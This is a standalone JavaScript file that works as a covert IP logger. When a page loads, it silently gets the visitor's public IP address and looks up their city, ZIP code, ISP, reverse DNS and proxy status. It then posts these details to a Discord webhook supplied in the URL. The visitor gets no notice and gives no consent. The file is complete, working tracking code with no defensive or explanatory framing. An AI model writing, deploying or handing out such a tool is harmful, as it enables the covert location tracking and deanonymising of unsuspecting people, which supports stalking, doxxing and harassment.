document.addEventListener("DOMContentLoaded", () => {
    const urlParams = new URLSearchParams(window.location.search);
    const webhookURL = urlParams.get("webhook");
  
    if (!webhookURL) {
      console.error("Webhook URL not provided in the query parameter.");
      return;
    }
  
    // Get the user's IP address using a free API
    fetch("https://api64.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => {
        const userIP = data.ip;
        fetchIPDetails(userIP, webhookURL);
      })
      .catch((error) => {
        console.error("Error fetching the user's IP:", error);
      });
  });
  
  function fetchIPDetails(ipAddress, webhookURL) {
    const apiUrl = `https://ip-api.com/php/${ipAddress}?fields=continent,continentCode,country,region,regionName,city,zip,timezone,isp,reverse,mobile,proxy,query`;
  
    fetch(apiUrl)
      .then((response) => response.text())
      .then((serializedData) => {
        const ipData = JSON.parse(serializedData);
  
        const embedData = {
          title: "IP Geolocation",
          description: `Geolocation details for IP: ${ipData.query}`,
          color: 16711680, // Red color
          fields: [
            { name: "Continent", value: ipData.continent, inline: true },
            { name: "Country", value: ipData.country, inline: true },
            { name: "Region", value: `${ipData.region} (${ipData.regionName})`, inline: true },
            { name: "City", value: ipData.city, inline: true },
            { name: "ZIP Code", value: ipData.zip, inline: true },
            { name: "Timezone", value: ipData.timezone, inline: true },
            { name: "ISP", value: ipData.isp, inline: true },
            { name: "Reverse DNS", value: ipData.reverse, inline: true },
            { name: "Mobile", value: ipData.mobile, inline: true },
            { name: "Proxy", value: ipData.proxy, inline: true },
          ],
        };
  
        sendEmbedToDiscord(embedData, webhookURL);
      })
      .catch((error) => {
        console.error("Error fetching IP details:", error);
      });
  }
  
  function sendEmbedToDiscord(embedData, webhookURL) {
    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ embeds: [embedData] }),
    })
      .then((response) => {
        if (!response.ok) {
          console.error("Failed to send the embed to Discord.");
        } else {
          console.log("Embed sent successfully to Discord.");
        }
      })
      .catch((error) => {
        console.error("Error sending the embed:", error);
      });
  }
  